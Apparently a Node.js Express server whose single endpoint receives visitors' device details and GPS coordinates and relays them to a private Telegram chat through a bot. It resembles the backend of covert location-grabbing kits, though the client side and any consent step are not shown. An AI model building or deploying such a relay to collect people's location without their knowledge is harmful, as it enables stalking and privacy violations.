import express from "express";
import fetch from "node-fetch";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function escapeMarkdownV2(text) {
  if (!text) return "";
  return text.toString().replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
}

app.post("/send-to-telegram", async (req, res) => {
  try {
    const {
      userAgent, browserName, platform, language, timezone,
      screenWidth, screenHeight, effectiveType, downlink,
      latitude, longitude, mapLink
    } = req.body;

    const message = `
📋 *Device Info:*
🤖 *User Agent:* ${escapeMarkdownV2(userAgent)}
🌐 *Browser:* ${escapeMarkdownV2(browserName)}
🖥️ *Platform:* ${escapeMarkdownV2(platform)}
🗣️ *Language:* ${escapeMarkdownV2(language)}
⏰ *Timezone:* ${escapeMarkdownV2(timezone)}
🖥️ *Screen:* ${escapeMarkdownV2(screenWidth + "x" + screenHeight)}
📡 *Network Type:* ${escapeMarkdownV2(effectiveType)}
📶 *Downlink Speed:* ${escapeMarkdownV2(downlink + " Mbps")}
🗺️ *Latitude:* ${escapeMarkdownV2(latitude)}
🗺️ *Longitude:* ${escapeMarkdownV2(longitude)}
🗺️ *Map:* ${escapeMarkdownV2(mapLink)}
🕒 *Timestamp:* ${escapeMarkdownV2(new Date().toLocaleString())}
`;

    const telegramRes = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "MarkdownV2"
        })
      }
    );

    if (telegramRes.ok) {
      res.json({ success: true });
    } else {
      const errorData = await telegramRes.json();
      res.status(500).json({ success: false, error: errorData.description });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
